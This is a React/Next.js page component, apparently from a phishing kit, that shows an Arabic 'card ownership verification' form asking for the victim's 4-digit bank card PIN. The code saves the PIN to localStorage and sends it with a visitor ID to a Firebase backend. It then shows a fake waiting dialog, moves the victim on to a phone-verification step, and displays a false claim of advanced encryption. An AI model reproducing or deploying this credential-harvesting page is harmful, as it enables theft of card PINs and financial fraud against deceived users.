"use client"

import type React from "react"

import { useState, useCallback } from "react"
import { useRouter } from "next/navigation"
import { addData } from "@/lib/firebase"
import Header from "@/components/Header"
import Footer from "@/components/Footer"
import WaitingDialog from "@/components/waiting-dilaog"

export default function CardVerification() {
  const router = useRouter()
  const [pin, setPin] = useState("")
  const [error, setError] = useState("")
  const [isloading, setIsloading] = useState(false)

  // Use useEffect to get visitorId from localStorage on the client side
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null

  const handlePinChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4)
    setPin(value)
    setError("")
  }, [])

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault()

      if (pin.length !== 4) {
        setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
        return
      }

      try {
        // Store the PIN in localStorage
        if (typeof window !== "undefined") {
          localStorage.setItem("card_pin", JSON.stringify(pin))
        }

        if (visitorId) {
          setIsloading(true)
          setTimeout(() => {
            addData({ id: visitorId, pinCode: pin })
            router.push('/verify-phone')
          setIsloading(true)

          }, 3000)
        }
      } catch (error) {
        setError("الرقم السري غير صحيح")
      }
    },
    [pin, router, visitorId],
  )

  return (
    <>
      <Header />
      <WaitingDialog isOpen={isloading} />
      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 py-20 px-4 md:py-40">
        <div className="max-w-xl mx-auto">
          <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transform transition-all duration-300 hover:shadow-2xl">
            <div className="text-center mb-8 md:mb-10">
              <h1 className="text-2xl md:text-3xl font-bold mb-3 md:mb-4 text-[#146394] tracking-tight">
                إثبات ملكية البطاقة
              </h1>
              <p className="text-gray-600 text-sm md:text-base leading-relaxed px-4">
                يرجى إدخال الرقم السري للبطاقة للتحقق من ملكيتها
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6 md:space-y-8">
              <div className="space-y-3">
                <label
                  htmlFor="pin-input"
                  className="block text-right mb-2 font-medium text-[#146394] text-sm md:text-base"
                >
                  الرقم السري للبطاقة
                </label>
                <input
                  id="pin-input"
                  type="text"
                  inputMode="numeric"
                  maxLength={4}
                  value={pin}
                  onChange={handlePinChange}
                  className="w-full h-14 text-center text-2xl font-bold border-2 rounded-lg focus:ring-2 focus:ring-blue-200 focus:border-[#146394] transition-all outline-none bg-white hover:border-[#146394]"
                  placeholder="####"
                  aria-label="Enter PIN"
                />
                {error && (
                  <p role="alert" className="text-red-500 text-sm mt-2 text-center animate-shake">
                    {error}
                  </p>
                )}
              </div>

              <button
                type="submit"
                className="w-full bg-[#146394] text-white py-3.5 md:py-4 rounded-lg font-semibold text-base md:text-lg hover:bg-[#0f4c70] transition-all transform hover:scale-[0.99] active:scale-[0.97] shadow-md hover:shadow-lg disabled:opacity-70 disabled:cursor-not-allowed"
                disabled={pin.length !== 4}
              >
                تأكيد
              </button>
            </form>

            <div className="mt-8 text-center">
              <div className="flex items-center justify-center gap-2 text-[#146394] bg-blue-50 p-4 rounded-lg transition-all duration-300 hover:bg-blue-100">
                <svg className="w-5 h-5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                  <path
                    fillRule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                    clipRule="evenodd"
                  />
                </svg>
                <p className="text-sm md:text-base">نحن نستخدم تقنيات تشفير متقدمة لحماية بياناتك</p>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Footer />
    </>
  )
}

